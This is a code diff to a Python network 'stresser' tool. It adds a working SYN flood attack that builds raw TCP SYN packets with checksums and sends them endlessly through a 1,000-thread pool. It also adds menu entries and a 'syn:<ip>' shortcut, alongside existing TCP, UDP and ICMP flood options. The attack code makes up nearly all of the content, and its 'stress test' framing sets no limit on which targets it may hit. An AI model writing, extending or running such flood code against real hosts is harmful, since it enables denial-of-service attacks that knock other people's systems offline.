@@ -28,6 +28,10 @@ import concurrent.futures
 from concurrent.futures import ThreadPoolExecutor
 import subprocess
 import time
+import struct
+import select
+import random
+
 
 #==================#
 # Global Variables #
@@ -155,12 +159,17 @@ def tcp_flood_attack(target_ip, target_port, number_of_packets=0, message="Hello
     # Print the summary of the attack
     print(f"Packets Sent: {packets_sent}")
     
-    
-    
-def syn_flood_attack(): # Because of restrictions on project scope, this feature is not yet implemented as it requires packet manipulation.
-    global target_ip
-    print("SYN Flooding " + target_ip + " on port " + str(target_port) + "...")
-    print("This feature is not yet implemented.")
+#==================#
+# SYN Flood Attack #
+#==================#
+
+def syn_flood_attack(target_ip, target_port): # Because of restrictions on project scope, this feature is not yet implemented as it requires packet manipulation.
+    try:
+        print("SYN Flooding " + target_ip + " on port " + str(target_port) + "...")
+        while True:
+            syn_flood(target_ip, target_port)
+    except KeyboardInterrupt:
+        print("Stopping SYN Flood attack...")
 
 #======================#
 #|> UDP Flood Attack <|#
@@ -208,17 +217,170 @@ def send_udp_packet(target_ip, target_port, message):
     finally:
         sock.close()
         
+#=======================================#
+# TCP Packet Construction for SYN Flood #
+#=======================================#
+
+def checksum(data):
+    """
+    Calculates the TCP checksum for given data, ensuring data integrity over the network.
+
+    The checksum is a critical part of the TCP/IP protocols, used to detect data corruption during transmission.
+    This function implements the checksum calculation by dividing the data into 16-bit words,
+    summing them together, and performing a bit-wise NOT operation on the result.
+
+    Parameters:
+    - data (bytes): The header and data for which the checksum is to be calculated.
+
+    Returns:
+    - The calculated checksum as an integer.
+    """
+    # Ensure the data is even-numbered in length by padding with a null byte if necessary.
+    if len(data) % 2 != 0:
+        data += b'\0'
         
-        
-        
-#=======================#
-#|> HTTP Flood Attack <|#
-#=======================#
+    # Sum the 16-bit words in the data
+    s = sum(array := struct.unpack('!'+str(len(data)//2)+'H', data))
+    s = (s >> 16) + (s & 0xffff)
+    s += s >> 16
     
-def http_flood_attack():
-    global target_ip
-    print("HTTP Flooding " + target_ip + " on port " + str(target_port) + "...")
-    print("This feature is not yet implemented.")
+    # Add carry, if any, by shifting the right 16 bits and adding to the sum.
+    # Then, perform a bit wise NOT operation to get the checksum.
+    s = ~s & 0xffff
+    return s
+
+def create_tcp_header(source_port, dest_port, checksum):
+    """
+    Manually constructs a TCP header with the specified parameters.
+
+    Parameters:
+    - source_port (int): The source port number.
+    - dest_port (int): The destination port number.
+    - checksum (int): The pre-calculated checksum for the header and data.
+
+    The TCP header includes fields like sequence numbers and flags. Here, we're particularly setting the SYN flag to initiate a connection.
+
+    The struct module is used to pack the header fields into a byte string, following the network byte order (!),
+    which is Big-Endian. This is crucial for ensuring that the packet is correctly interpreted by network devices.
+
+    Returns:
+    - A byte string representing the TCP header.
+    """
+    # TCP header are packed using the struct module to ensure correct byte order.
+    # This includes the source port, destination port, sequence number, acknowledgment number, and data offset,
+    # flags (with SYN flag set), window size, checksum, and urgent pointer.
+    seq = 0
+    ack_seq = 0
+    doff = 5
+    syn_flag = 2
+    window = socket.htons(5840)
+    urg_ptr = 0
+    offset_res = (doff << 4) + 0
+    tcp_flags = syn_flag
+    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, checksum, urg_ptr)
+    return tcp_header
+
+def get_source_ip(target_ip):
+    """ Get the source IP address of the machine """
+    try:
+        # Temporary socket to determine the source IP
+        temp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        temp_sock.connect((target_ip, 80))  # 80 is arbitrary, no data is sent
+        source_ip = temp_sock.getsockname()[0]
+        temp_sock.close()
+        return source_ip
+    except Exception as e:
+        print(f"Could not determine source IP: {e}")
+        return None
+
+def send_syn_packet(target_ip, target_port):
+    # Sends a single SYN packet to the target IP and port
+    try:
+        source_ip = get_source_ip(target_ip)
+        if not source_ip:
+            print("Source IP could not be determined. Aborting SYN packet send.")
+            return
+    
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) # Create a raw socket to send the SYN packet
+
+        placeholder_tcp_header = create_tcp_header(source_port=12345, dest_port=target_port, checksum=0)
+        pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(source_ip), socket.inet_aton(target_ip), 0, socket.IPPROTO_TCP, len(placeholder_tcp_header)) # Create the pseudo header for checksum calculation
+        psh = pseudo_header + placeholder_tcp_header # Combine the pseudo header and TCP header
+        tcp_checksum = checksum(psh) # Calculate the checksum for the pseudo header and TCP header.
+        tcp_header = create_tcp_header(source_port=12345, dest_port=target_port, checksum=tcp_checksum) # Create the TCP header with the correct checksum
+        s.sendto(tcp_header, (target_ip, target_port)) # Send the SYN packet to the target IP and port
+        
+        
+        ready = select.select([s], [], [], 5) # Wait for <x> seconds for a response (x=5)
+        if ready[0]:
+            data, addr = s.recvfrom(1024)
+            tcp_header_len = (data[32] >> 4) * 4
+            tcp_header = data[20:20+tcp_header_len]
+            if len(tcp_header) > 13:
+                flags = tcp_header[13]
+                if flags & 0x12:  # SYN-ACK
+                    print(f"Port {target_port} is open (SYN-ACK received).")
+                elif flags & 0x04:  # RST
+                    print(f"Port {target_port} is closed (RST received).")
+        else:
+            print(f"No response received for port {target_port}, it might be filtered or the scan timed out.")
+    except PermissionError:
+        print("Permission denied. Please run the script as a superuser (root).")
+        exit()
+    except Exception as e:
+        print(f"Error sending SYN packet: {e}")
+    except KeyboardInterrupt:
+        print("SYN packet send stopped by user.")
+        return
+    
+#=======================================#
+# TCP Packet Construction for SYN Flood #
+#=======================================#
+
+
+def syn_flood(target_ip, target_port, number_of_packets=0):
+    """
+    Conducts a SYN flood attack on the target IP and port by sending multiple SYN packets.
+
+    The attack involves sending a high volume of SYN packets to overwhelm the target system,
+    causing it to consume resources and potentially become unresponsive.
+
+    Parameters:
+    - target_ip (str): The IP address of the target system.
+    - target_port (int): The port number on the target system.
+    - number_of_packets (int): The number of SYN packets to send. If 0, the attack runs indefinitely.
+    """
+    global packets_sent
+    print(f"Initiating SYN Flood Attack on {target_ip}:{target_port}... Press CTRL+C to stop.")
+
+    # Reset packet tracking
+    packets_sent = 0
+    
+    # Define the stop condition for the infinite loop
+    stop_attack = False
+    while stop_attack == False:
+        try:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
+                futures = []
+                for _ in range(number_of_packets or 1):  # Ensure at least one packet is sent if number_of_packets is 0
+                    if stop_attack:
+                        break
+                    futures.append(executor.submit(send_syn_packet, target_ip, target_port))
+
+                # If number_of_packets is 0, run indefinitely
+                while number_of_packets == 0 and not stop_attack:
+                    futures.append(executor.submit(send_syn_packet, target_ip, target_port))
+
+                # Wait for all futures to complete if a specific number of packets is set
+                if number_of_packets:
+                    concurrent.futures.wait(futures)
+        except PermissionError:
+            print("Permission denied. Please run the script as a superuser (root).")
+            stop_attack = True
+        except KeyboardInterrupt:
+            stop_attack = True
+            print(f"\nAttack stopped by user. Total Packets Sent: {packets_sent}")
+        
 
 #======================#
 #|> Slowloris Attack <|#
@@ -253,13 +415,12 @@ def is_target_valid():
 def menu_stresser_options():
     # Options
     tcp_floot_option = menu_option(1, "TCP Flood Attack (Currently testing, varied performance based on network and OS)")
-    syn_flood_option = menu_option(2, "SYN Flood Attack (Will be removed in future versions)")
-    udp_flood_option = menu_option(3, "UDP Flood Attack (Currently Fastest)")
-    http_flood_option = menu_option(4, "HTTP Flood Attack (Not yet implemented)")
+    syn_flood_option = menu_option(2, "SYN Flood Attack (Superuser/root REQUIRED)")
+    udp_flood_option = menu_option(3, "UDP Flood Attack")
     slowloris_option = menu_option(5, "Slowloris Attack (Not yet implemented)")
     ICMP_option = menu_option(6, "ICMP Attack (Testing Phase)")
     
-    options = f"{tcp_floot_option}{syn_flood_option}{udp_flood_option}{http_flood_option}{slowloris_option}{ICMP_option}"
+    options = f"{tcp_floot_option}{syn_flood_option}{udp_flood_option}{slowloris_option}{ICMP_option}"
     return options
     
 #=================#
@@ -292,10 +453,7 @@ This tool will allow you to stress test a network by conducting various attacks 
         
         tcp_flood_attack(target_ip, target_port)
         
-    elif "tcp:" in attack_choice: # TCP Flood Attack |COMMAND| Default port is 80 and packets is 0. | Command: tcp:<ip> |
-        attack_choice = attack_choice.split(":")
-        target_ip = attack_choice[1]
-        tcp_flood_attack(target_ip, 80)
+
         
         
     elif attack_choice == "2": # SYN Flood Attack
@@ -304,19 +462,28 @@ This tool will allow you to stress test a network by conducting various attacks 
     elif attack_choice == "3": # UDP Flood Attack
         target_ip = is_target_valid()
         udp_flood(target_ip, 80, "Hello", packets) # NEEDS TO BE TESTED
-    elif attack_choice == "4": # HTTP Flood Attack
-        target_ip = is_target_valid()
-        http_flood_attack()
-    elif attack_choice == "5": # Slowloris Attack
+    elif attack_choice == "4": # Slowloris Attack
         target_ip = is_target_valid()
         slowloris_attack()
-    elif attack_choice == "6": # ICMP Attack
+    elif attack_choice == "5": # ICMP Attack
         target_ip = is_target_valid()
         ping_attack(target_ip, 10000)
+    
+    # Shortcut commands for attacks.
+    elif "tcp:" in attack_choice: # TCP Flood Attack |COMMAND| Default port is 80 and packets is 0. | Command: tcp:<ip> |
+        attack_choice = attack_choice.split(":")
+        target_ip = attack_choice[1]
+        tcp_flood_attack(target_ip, 80)
+    elif "syn:" in attack_choice: # SYN Flood Attack |COMMAND| Default port is 80 and packets is 0. | Command: syn:<ip> |
+        attack_choice = attack_choice.split(":")
+        target_ip = attack_choice[1]
+        target_port = attack_choice[2]
+        syn_flood_attack(target_ip, 80)
     else:
         print("Invalid option. Please try again.")
+        input("Press Enter to Continue...")
     
-    input("Press Enter to Continue...")
+    
     
     #target_ip = is_target_valid()
     #tcp_flood_attack(target_ip, 80)
